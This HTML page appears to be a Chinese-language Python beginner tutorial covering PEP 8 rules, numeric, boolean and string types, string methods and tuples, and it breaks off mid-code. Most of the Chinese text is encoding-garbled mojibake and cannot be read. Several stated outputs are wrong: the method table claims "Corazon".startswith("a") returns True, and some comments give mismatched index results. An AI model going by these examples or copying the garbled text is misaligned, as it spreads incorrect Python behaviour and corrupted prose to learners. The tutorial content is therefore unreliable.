<p>Python é‡‡ç”¨ PEP 8 ä½œä¸ºç¼–ç è§„èŒƒï¼Œå…¶ä¸­ PEP æ˜¯ Python Enhancement Proposalï¼ˆPython å¢å¼ºå»ºè®®ä¹¦ï¼‰çš„ç¼©å†™;8 ä»£è¡¨çš„æ˜¯ Python ä»£ç çš„æ ·å¼æŒ‡å—ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ä¸‹é¢ä»…ç»™å¤§å®¶åˆ—å‡º PEP 8 ä¸­åˆå­¦è€…åº”ä¸¥æ ¼éµå®ˆçš„ä¸€äº›ç¼–å†™è§„åˆ™ï¼š</p>
</li>
<li class="lvl-2">
<p>ä¸è¦åœ¨è¡Œå°¾æ·»åŠ åˆ†å·&quot;;&quot;</p>
</li>
<li class="lvl-2">
<p>ä¸è¦ç”¨åˆ†å·å°†ä¸¤æ¡å‘½ä»¤æ”¾åœ¨åŒä¸€è¡Œ;</p>
</li>
<li class="lvl-2">
<p>åœ¨è¿ç®—ç¬¦ä¸¤ä¾§ã€å‡½æ•°å‚æ•°ä¹‹é—´ä»¥åŠé€—å·ä¸¤ä¾§ï¼Œéƒ½ä½¿ç”¨ç©ºæ ¼åˆ†éš”;</p>
</li>
<li class="lvl-2">
<p>ä½¿ç”¨å¿…è¦çš„ç©ºè¡Œå¯ä»¥å¢åŠ ä»£ç çš„å¯è¯»æ€§ï¼Œé€šå¸¸åœ¨é¡¶çº§å®šä¹‰ï¼ˆå¦‚å‡½æ•°æˆ–ç±»çš„å®šä¹‰ï¼‰ä¹‹é—´ç©ºä¸¤è¡Œï¼Œè€Œæ–¹æ³•å®šä¹‰ä¹‹é—´ç©ºä¸€è¡Œ;</p>
</li>
<li class="lvl-2">
<p>å¦å¤–åœ¨ç”¨äºåˆ†éš”æŸäº›åŠŸèƒ½çš„ä½ç½®ä¹Ÿå¯ä»¥ç©ºä¸€è¡Œã€‚</p>
</li>
<li class="lvl-2">
<p>pythonä¸­æœ‰äº›ç‰¹æ®Šè¯­å¥æŒ‡ä»¤ç»“å°¾ï¼Œéœ€è¦åŠ å…¥ï¼š</p>
</li>
</ul>
<h2 id="pythonæ•°æ®ç±»å‹ä»‹ç»">pythonæ•°æ®ç±»å‹ä»‹ç»</h2>
<p>åœ¨pythonå¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å°†æ•°æ®ç±»å‹åˆ†ä¸ºä¸¤ä¸ªå¤§ç±»ï¼š</p>
<p>pythonåŸºæœ¬æ•°æ®ç±»å‹ï¼šå­—ç¬¦ä¸² æ•°å€¼å‹(æ•´å‹ å¸ƒå°”å‹) æµ®ç‚¹å‹</p>
<p>pythonå¤åˆæ•°æ®ç±»å‹ï¼šå…ƒç»„ã€åˆ—è¡¨ã€å­—å…¸ã€é›†åˆ</p>
<h3 id="æ•°æ®ç±»å‹ä¹‹æ•°å­—ç±»å‹ä»‹ç»">æ•°æ®ç±»å‹ä¹‹æ•°å­—ç±»å‹ä»‹ç»</h3>
<h4 id="æ•´æ•°ç±»å‹">æ•´æ•°ç±»å‹</h4>
<p>pythonä¸­çš„æ•´å‹ï¼Œå³intç±»å‹ï¼ŒPythonä¸­æ²¡æœ‰å¯¹æ•´å‹æ•°å­—å¤§å°é™åˆ¶ï¼›</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ•´æ•°ç±»å‹ç¤ºä¾‹</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(x) <span class="comment">#   è¾“å‡ºxçš„å€¼    </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x))  <span class="comment">#æ‰“å°ç±»å‹ï¼Œtype()å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç±»å‹</span></span><br><span class="line"><span class="comment"># å°†ä¸åŒè¿›åˆ¶æ•°è½¬æˆåè¿›åˆ¶</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0x11</span>, <span class="number">0b101</span>, <span class="number">0O12</span>, <span class="number">20</span>)</span><br><span class="line"><span class="comment">#ä¸ºå®ç°è¿›åˆ¶æ•°äº’ç›¸è½¬æ¢ï¼ŒPythonä¸­å†…ç½®äº†ç”¨äºè½¬æ¢çš„å‡½æ•°ï¼š</span></span><br><span class="line">y = <span class="number">0b10001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(y),<span class="built_in">oct</span>(y),<span class="built_in">int</span>(y),<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="number">17</span> <span class="number">5</span> <span class="number">10</span> <span class="number">20</span></span><br><span class="line"><span class="number">0b10001</span> <span class="number">0o21</span> <span class="number">17</span> <span class="number">0x11</span></span><br></pre></td></tr></table></figure>
<h4 id="æµ®ç‚¹ç±»å‹">æµ®ç‚¹ç±»å‹</h4>
<p>åœ¨pythonä¸­å°æ•°éƒ½å±äºæµ®ç‚¹å‹(floatï¼‰,æœ‰ä¸¤ç§è¡¨ç°å½¢å¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°æ•°ç‚¹å½¢å¼ï¼ˆå¸¸ç”¨ï¼‰ï¼Œè¾ƒå°çš„å°æ•°è¡¨ç¤º</span></span><br><span class="line">f =  <span class="number">3.14</span></span><br><span class="line">num1 = <span class="number">3.1415926</span> + <span class="number">3.1415926</span></span><br><span class="line">x = <span class="number">1</span></span><br><span class="line">y = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">f1 =  -<span class="number">3.14E2</span>  <span class="comment"># æŒ‡æ•°å½¢å¼ï¼š aEn æˆ– aenï¼Œè¾ƒå¤§çš„å°æ•°è¡¨ç¤º</span></span><br><span class="line">f2 =  <span class="number">3.14e-2</span>  <span class="comment"># æŒ‡æ•°å½¢å¼ï¼š aEn æˆ– aenï¼Œè¾ƒå¤§çš„å°æ•°è¡¨ç¤º</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;f:&quot;</span>,<span class="built_in">type</span>(f))</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">3.1415926</span>+<span class="number">3.1415926</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x:&quot;</span>,<span class="built_in">type</span>(x), <span class="string">&quot;y:&quot;</span>,<span class="built_in">type</span>(y))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;f1:&quot;</span>,<span class="built_in">type</span>(f1),<span class="string">&quot;f2:&quot;</span>,<span class="built_in">type</span>(f2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œç»“æœ</span></span><br><span class="line">f: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br><span class="line"><span class="number">6.2831852</span></span><br><span class="line"><span class="number">6.2831852</span></span><br><span class="line">x: &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt; y: &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">f1: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt; f2: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="å¸ƒå°”ç±»å‹">å¸ƒå°”ç±»å‹</h4>
<p>å¸ƒå°”å‹ï¼ˆBoolï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šæ•°æ®ç±»å‹ï¼Œå¸¸ç”¨äºåˆ¤æ–­ï¼Œè¿™ç§ç±»å‹åªæœ‰ä¸¤ç§å€¼ï¼Œå³&quot;çœŸ&quot;ä¸&quot;å‡&quot;ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">4</span> == <span class="number">2</span>,<span class="number">5</span> &gt; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># ä¹Ÿå¯ä»¥åšå­—ç¬¦åˆ¤æ–­   --åˆ¤æ–­å¤§å° ä¾æ®asciiç¼–ç </span></span><br><span class="line">name = <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name == <span class="string">&quot;lisi&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line"><span class="literal">False</span> <span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸å…‰ä¸Šé¢ä»£ç è¯­å¥çš„ç»“æœæ˜¯å¸ƒå°”å€¼ï¼Œå•ç‹¬ä¸€ä¸ªæ•°æ®æ²¡æœ‰è¿›è¡Œè®¡ç®—ä¹Ÿå¯ä»¥éƒ½æœ‰è‡ªå·±çš„å¸ƒå°”å€¼ï¼Œè¿™å°±æ¶‰åŠåˆ°å¸ƒå°”çš„é›¶å€¼ã€‚</span></span><br><span class="line"><span class="comment"># ä»»æ„æ•°æ®ç±»å‹éƒ½æœ‰ä¸€ä¸ªå…·ä½“å€¼çš„å¸ƒå°”å€¼ä¸ºFalse,æˆ‘ä»¬ç§°ä¸ºé›¶å€¼ã€‚è¯¥ç±»å‹çš„å…¶ä»–å€¼çš„å¸ƒå°”å€¼çš†ä¸ºTrueã€‚</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="string">&quot;Cozrzon&quot;</span>),<span class="built_in">bool</span>(<span class="number">0</span>)) <span class="comment"># å­—ç¬¦ä¸²çš„é›¶å€¼True False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="number">24</span>),<span class="built_in">bool</span>(<span class="number">0</span>))        <span class="comment"># æ•´å‹çš„é›¶å€¼  True False</span></span><br></pre></td></tr></table></figure>
<h4 id="æ•°æ®ç±»å‹é—´ç›¸äº’è½¬æ¢æ–¹æ³•">æ•°æ®ç±»å‹é—´ç›¸äº’è½¬æ¢æ–¹æ³•</h4>
<p>pythonå†…ç½®äº†è¿›è¡Œè½¬æ¢æ•°æ®ç±»å‹çš„å‡½æ•°ï¼Œå¸¸è§æœ‰int()ã€float()ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># int() è½¬æˆæ•´å‹</span></span><br><span class="line"><span class="comment"># float() è½¬æˆå°æ•°</span></span><br><span class="line">x = <span class="number">3</span></span><br><span class="line">y = <span class="number">3.14</span></span><br><span class="line"><span class="comment">#æ³¨æ„ï¼šæµ®ç‚¹å‹è½¬æ¢ä¸ºæ•´æ•°å‹æ—¶ç›´æ¥èˆå»å°æ•°éƒ¨åˆ†ï¼ˆå‘ä¸‹å–æ•´ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(x, <span class="built_in">type</span>(x), y, <span class="built_in">type</span>(y))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(x), <span class="built_in">type</span>(<span class="built_in">float</span>(x)), <span class="built_in">int</span>(y), <span class="built_in">type</span>(<span class="built_in">int</span>(y)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œç»“æœ</span></span><br><span class="line"><span class="number">3</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt; <span class="number">3.14</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br><span class="line"><span class="number">3.0</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt; <span class="number">3</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="æ•°æ®ç±»å‹å€¼å­—ç¬¦ç±»å‹ä»‹ç»">æ•°æ®ç±»å‹å€¼å­—ç¬¦ç±»å‹ä»‹ç»</h3>
<h4 id="å­—ç¬¦ä¸²æ ¼å¼">å­—ç¬¦ä¸²æ ¼å¼</h4>
<p>å•è¡Œå­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨åŒå¼•å·ï¼Œç›´æ¥è¾“å‡ºå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hi,Corazon&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥å˜é‡çš„å½¢å¼è¾“å‡ºå­—ç¬¦ä¸²ï¼Œé‡‡ç”¨å•å¼•å·å®šä¹‰</span></span><br><span class="line">s1 = <span class="string">&#x27;hi,Corazon&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure>
<p>å¤šè¡Œå­—ç¬¦ä¸²ä¹Ÿå«æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œå°±æ˜¯ä¸‰ä¸ªå•å¼•å·æˆ–è€…ä¸‰ä¸ªåŒå¼•å·åœˆä½çš„å†…å®¹ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯å­—ç¬¦ä¸²ï¼›</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">s1 = &quot;hi,boy\nhi,girl&quot;</span></span><br><span class="line"><span class="string">s2 = &#x27;I\&#x27;m Corazon&#x27;</span></span><br><span class="line"><span class="string">s3 = &quot;D:\\ä¸­ç§‘äººæ‰\\python.exe&quot;</span></span><br><span class="line"><span class="string">s4 = &quot;æˆ‘æ˜¯ä¸­ç§‘äººæ‰ï¼Œ\</span></span><br><span class="line"><span class="string">æˆ‘å–œæ¬¢python&quot;</span></span><br><span class="line"><span class="string">é•¿å­—ç¬¦ä¸²ä¸­æ”¾ç½®å•å¼•å·æˆ–è€…åŒå¼•å·ä¸ä¼šå¯¼è‡´è§£æé”™è¯¯</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">s1 = <span class="string">&quot;hi,boy</span></span><br><span class="line"><span class="string">hi,girl&quot;</span></span><br><span class="line">s2 = <span class="string">&#x27;I&#x27;</span>m Corazon<span class="string">&#x27;</span></span><br><span class="line"><span class="string">s3 = &quot;D:\ä¸­ç§‘äººæ‰\python.exe&quot;</span></span><br><span class="line"><span class="string">s4 = &quot;æˆ‘æ˜¯ä¸­ç§‘äººæ‰ï¼Œæˆ‘å–œæ¬¢python&quot;</span></span><br><span class="line"><span class="string">é•¿å­—ç¬¦ä¸²ä¸­æ”¾ç½®å•å¼•å·æˆ–è€…åŒå¼•å·ä¸ä¼šå¯¼è‡´è§£æé”™è¯¯</span></span><br></pre></td></tr></table></figure>
<h4 id="å­—ç¬¦ä¸²ä¿¡æ¯è½¬ä¹‰è®¾ç½®">å­—ç¬¦ä¸²ä¿¡æ¯è½¬ä¹‰è®¾ç½®</h4>
<p>æœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¿¡æ¯å‰é¢åŠ \ è½¬ä¹‰å­—ç¬¦ä¼šæœ‰ç‰¹æ®Šçš„å«ä¹‰ä½œç”¨ï¼š</p>
<table>
<thead>
<tr>
<th>è½¬ä¹‰å­—ç¬¦</th>
<th>è¯´æ˜</th>
<th>è½¬ä¹‰å­—ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>\n</td>
<td>æ¢è¡Œç¬¦ï¼Œå°†å…‰æ ‡ä½ç½®ç§»åˆ°ä¸‹ä¸€è¡Œå¼€å¤´</td>
<td>\r</td>
<td>å›è½¦ç¬¦ï¼Œå°†å…‰æ ‡ä½ç½®ç§»åˆ°æœ¬è¡Œå¼€å¤´</td>
</tr>
<tr>
<td>\t</td>
<td>æ°´å¹³åˆ¶è¡¨ç¬¦ï¼Œä¹Ÿå³ Tab é”®ï¼Œä¸€èˆ¬ç›¸å½“äºå››ä¸ªç©ºæ ¼</td>
<td>\b</td>
<td>é€€æ ¼ï¼ˆBackspaceï¼‰ï¼Œå°†å…‰æ ‡ä½ç½®ç§»åˆ°å‰ä¸€åˆ—</td>
</tr>
<tr>
<td>\ä»»æ„å­—ç¬¦</td>
<td>è½¬ä¹‰ï¼Œä¾‹å¦‚<code>'</code>ï¼Œ<code>&quot;</code>,<code> \</code>ç­‰</td>
<td>è¡Œå°¾\</td>
<td>ä¸æ¢è¡Œï¼Œå¤šè¡Œç¼–è¾‘ä¸€è¡Œè¾“å‡º</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä»£ç æ“ä½œç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 ç´¢å¼•å–å€¼</span></span><br><span class="line">s = <span class="string">&quot;helloï¼ŒCorazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>])  <span class="comment"># ç´¢å¼•ä»å‰åˆ°åï¼Œä»0å¼€å§‹ï¼Œ1å¯¹åº”çš„å­—ç¬¦ä¸ºe</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">3</span>])  <span class="comment"># ç´¢å¼•ä»ååˆ°å‰ï¼Œä»-1å¼€å§‹ï¼Œ-3ä¸ºå€’æ•°ç¬¬ä¸‰ä¸ªå­—ç¬¦ï¼Œå¯¹åº”çš„å­—ç¬¦ä¸ºk</span></span><br><span class="line"><span class="comment"># 02 åˆ‡ç‰‡å–å€¼ï¼šåºåˆ—ç±»å‹å¯¹è±¡[start : end : step]</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>:<span class="number">5</span>])  <span class="comment"># llo     ï¼šå–ç´¢å¼•1åˆ°ç´¢å¼•3ï¼ˆå·¦é—­å³å¼€ï¼‰ == [1:3)</span></span><br><span class="line"><span class="built_in">print</span>(s[:<span class="number">5</span>])  <span class="comment"># hello   ï¼šstartç¼ºçœï¼Œé»˜è®¤ä»0å–</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">6</span>:])  <span class="comment"># Corazon ï¼šendç¼ºçœï¼Œé»˜è®¤å–åˆ°æœ€å</span></span><br><span class="line"><span class="comment"># 03 åˆ¤æ–­å­˜åœ¨ï¼šä½¿ç”¨inå…³é”®å­—æ£€æŸ¥æŸå…ƒç´ æ˜¯å¦ä¸ºåºåˆ—çš„æˆå‘˜ã€‚</span></span><br><span class="line">s = <span class="string">&quot;hello,Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Corazon&quot;</span> <span class="keyword">in</span> s)  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Leonidas&quot;</span> <span class="keyword">in</span> s)  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 04 +/*è¿ç®—ï¼šæ”¯æŒä½¿ç”¨â€œ+â€è¿ç®—ç¬¦åšç›¸åŠ æ“ä½œï¼Œå®ƒä¼šå°†ä¸¤ä¸ªåºåˆ—è¿›è¡Œè¿æ¥ï¼Œä½†ä¸ä¼šå»é™¤é‡å¤çš„å…ƒç´ ã€‚</span></span><br><span class="line"><span class="comment">#            ä½¿ç”¨æ•°å­— n ä¹˜ä»¥ä¸€ä¸ªåºåˆ—ä¼šç”Ÿæˆæ–°çš„åºåˆ—ï¼Œå…¶å†…å®¹ä¸ºåŸæ¥åºåˆ—è¢«é‡å¤ n æ¬¡çš„ç»“æœã€‚</span></span><br><span class="line">s = <span class="string">&quot;hello&quot;</span> + <span class="string">&quot;Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># è¾“å‡ºhelloCorazon</span></span><br><span class="line">s = <span class="string">&quot;hello&quot;</span> + <span class="string">&quot;,Corazon!!!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">30</span>)  <span class="comment"># è¾“å‡º30ä¸ª*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">e</span><br><span class="line">z</span><br><span class="line">llo</span><br><span class="line">hello</span><br><span class="line">Corazon</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">helloCorazon</span><br><span class="line">hello,Corazon!!!hello,Corazon!!!</span><br><span class="line">******************************</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="å­—ç¬¦ä¸²å†…ç½®æ–¹æ³•">å­—ç¬¦ä¸²å†…ç½®æ–¹æ³•</h4>
<p>åœ¨å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œæ—¶ï¼Œè¿˜ä¼šå­˜åœ¨ä¸€äº›å†…ç½®çš„æ–¹æ³•å‡½æ•°ï¼Œå®Œæˆå¯¹å­—ç¬¦ä¸²ä¿¡æ¯çš„ç‰¹æ®Šéœ€æ±‚å¤„ç†ï¼š</p>
<table>
<thead>
<tr>
<th><strong>æ–¹æ³•</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>ç¤ºä¾‹</strong></th>
<th><strong>è¾“å‡º</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>upper</code></td>
<td>å¤§å†™</td>
<td><code>&quot;hello&quot;.upper()</code></td>
<td><code>&quot;HELLO&quot;</code></td>
</tr>
<tr>
<td><code>lower</code></td>
<td>å°å†™</td>
<td><code>&quot;Hello&quot;.lower()</code></td>
<td><code>&quot;hello&quot;</code></td>
</tr>
<tr>
<td><code>startswith()</code></td>
<td>æ˜¯å¦ä»¥aå¼€å¤´</td>
<td><code>&quot;Corazon&quot;.startswith(&quot;a&quot;)</code></td>
<td><code>True</code></td>
</tr>
<tr>
<td><code>endswith()</code></td>
<td>æ˜¯å¦ä»¥aç»“å°¾</td>
<td><code>&quot;Corazon&quot;.endswith(&quot;a&quot;)</code></td>
<td><code>False</code></td>
</tr>
<tr>
<td><strong><code>isdigit()</code></strong></td>
<td>æ˜¯å¦å…¨æ•°å­—</td>
<td><code>'123'.isdigit()</code></td>
<td><code>True</code></td>
</tr>
<tr>
<td><code>isalpha()</code></td>
<td>æ˜¯å¦å…¨å­—æ¯</td>
<td><code>'Corazon123'.isalpha()</code></td>
<td><code>False</code></td>
</tr>
<tr>
<td><code>isalnum()</code></td>
<td>æ˜¯å¦å…¨ä¸ºå­—æ¯æˆ–æ•°å­—</td>
<td><code>'Corazon123'.isalnum()</code></td>
<td><code>True</code></td>
</tr>
<tr>
<td><code>strip()</code></td>
<td>å»ä¸¤è¾¹ç©ºæ ¼</td>
<td><code>&quot; hi Corazon \n&quot;.strip()</code></td>
<td><code>&quot;hi Corazon&quot;</code></td>
</tr>
<tr>
<td><strong><code>join()</code></strong></td>
<td>å¤šå­—ç¬¦ä¸²è¿æ¥</td>
<td><code>&quot;-&quot;.join([&quot;Corazon&quot;,&quot;eric&quot;])</code></td>
<td><code>&quot;Corazon-eric&quot;</code></td>
</tr>
<tr>
<td><strong><code>split()</code></strong></td>
<td>åˆ†å‰²å­—ç¬¦ä¸²ï¼Œé»˜è®¤ç©ºæ ¼</td>
<td><code>&quot;Corazon-eric&quot;.split(&quot;-&quot;)</code></td>
<td><code>['Corazon', 'eric']</code></td>
</tr>
<tr>
<td><strong><code>find()</code></strong></td>
<td>è¿”å›æŒ‡å®šå­—ç¬¦ä¸²ç´¢å¼•ï¼Œæ²¡æœ‰è¿”å›-1</td>
<td><code>&quot;world&quot;.find(&quot;w&quot;)</code></td>
<td>0</td>
</tr>
<tr>
<td><strong><code>index()</code></strong></td>
<td>è¿”å›æŒ‡å®šå­—ç¬¦ä¸²ç´¢å¼•ï¼Œæ‰¾ä¸åˆ°ä¼šæŠ¥é”™</td>
<td><code>&quot;world&quot;.index(&quot;w&quot;)</code></td>
<td>0</td>
</tr>
<tr>
<td><strong><code>count()</code></strong></td>
<td>ç»Ÿè®¡æŒ‡å®šå­—ç¬¦ä¸²å‡ºç°æ¬¡æ•°</td>
<td><code>&quot;world&quot;.count(&quot;l&quot;)</code></td>
<td>1</td>
</tr>
<tr>
<td><strong><code>len(s)</code></strong></td>
<td>è¿”å›å­—ç¬¦ä¸²é•¿åº¦</td>
<td><code>len(&quot;Hello,Corazon!!!&quot;))</code></td>
<td>16</td>
</tr>
<tr>
<td><strong><code>replace()</code></strong></td>
<td>æ›¿æ¢oldä¸ºnew</td>
<td><code>'oldold'.replace('old','new',1)</code><br>â€˜oldoldâ€™.replace(â€˜oldâ€™,â€˜newâ€™)</td>
<td><code>newold</code><br><code>newnew</code></td>
</tr>
<tr>
<td><code>format()</code></td>
<td>æ ¼å¼åŒ–æ–¹æ³•</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p><font class="notice">æ³¨æ„ï¼šindex()å’Œfind()æ–¹æ³•åªèƒ½åŒ¹é…é¦–ä¸ªæŒ‡å®šå­—ç¬¦çš„ç´¢å¼•</font></p>
<h3 id="å¤åˆæ•°æ®ç±»å‹"><strong>å¤åˆæ•°æ®ç±»å‹</strong></h3>
<h4 id="å…ƒç»„æ•°æ®ç±»å‹"><strong>å…ƒç»„æ•°æ®ç±»å‹</strong></h4>
<p><strong>å…ƒç»„æ•°æ®ç±»å‹å®šä¹‰ï¼š</strong></p>
<p>å…ƒç»„çš„å…ƒç´ åªèƒ½è¯»ï¼Œä¸èƒ½è¿›è¡Œä¿®æ”¹ï¼ˆä¸‹æ ‡ä¸èƒ½æ”¹ å…ƒç´ ä¸èƒ½æ”¹ é•¿åº¦ä¸èƒ½å¢åŠ  ä½†æ•´ä½“å¯ä»¥æ”¹ï¼‰ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œå…ƒç»„ç”¨äºä¿å­˜æ— éœ€ä¿®æ”¹çš„å†…å®¹ï¼›å…ƒç»„ä½¿ç”¨å°æ‹¬å·è¡¨ç¤ºå£°æ˜ï¼ˆå®šä¹‰ï¼‰ä¸€ä¸ªå…ƒç´ æ•°æ®ç±»å‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(element1, element2, element3, ..., elementn)</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨æ„ï¼šå½“åˆ›å»ºçš„å…ƒç»„ä¸­åªæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å…ƒç´ æ—¶ï¼Œè¯¥å…ƒç´ åé¢å¿…é¡»è¦åŠ ä¸€ä¸ªé€—å·ï¼Œå¦åˆ™pythonè§£é‡Šå™¨ä¼šå°†å®ƒè§†ä¸ºå­—ç¬¦ä¸² </font></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä»£ç æ“ä½œç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(l,<span class="built_in">type</span>(l)) <span class="comment"># (1, 2, 3) &lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">pen = (<span class="string">&quot;pear1&quot;</span>, <span class="string">&quot;pear2&quot;</span>, <span class="string">&quot;pear3&quot;</span>)  <span class="comment"># å°æ‹¬å·</span></span><br><span class="line"><span class="comment"># æ‰“å°å…ƒç»„æ‰€æœ‰å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(pen)</span><br></pre></td></tr></table></figure>

    </div>
</div>
<p><strong>02</strong> <strong>å…ƒç»„æ•°æ®åºåˆ—æ“ä½œï¼š</strong></p>
<p>å…ƒç»„æ•°æ®ä¿¡æ¯è°ƒå–å’Œåˆ—è¡¨æ“ä½œåŸºæœ¬ä¸€è‡´ï¼Œæ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡æ“ä½œã€‚</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        ä»£ç æ“ä½œç¤ºä¾‹
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = (<span class="string">&quot;element1&quot;</span>, <span class="string">&quot;element2&quot;</span>, <span class="string">&quot;element3&quot;</span>, <span class="string">&quot;element4&quot;</span>, <span class="string">&quot;element5&quot;</span>, <span class="string">&quot;element6&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>])  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡ç‰‡æ“ä½œ</span></span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>:<span class="number">4</span>])  <span class="comment"># (3, 4)  ä¹Ÿæ˜¯å‰é—­åå¼€ [2:4)</span></span><br><span class="line"><span class="built_in">print</span>(l[:<span class="number">4</span>])  <span class="comment"># (1, 2, 3, 4)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;element2&quot;</span> <span class="keyword">in</span> l)  <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ—è¡¨ä¿¡æ¯å¾ªç¯éå†ï¼š</span></span><br><span class="line">pen = (<span class="string">&quot;pear1&quot;</span>, <span class="string">&quot;pear2&quot;</span>, <span class="string">&quot;pear3&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> pen:</span><br><span class="line">    <span class="built_in">print</span>(item,end=<span 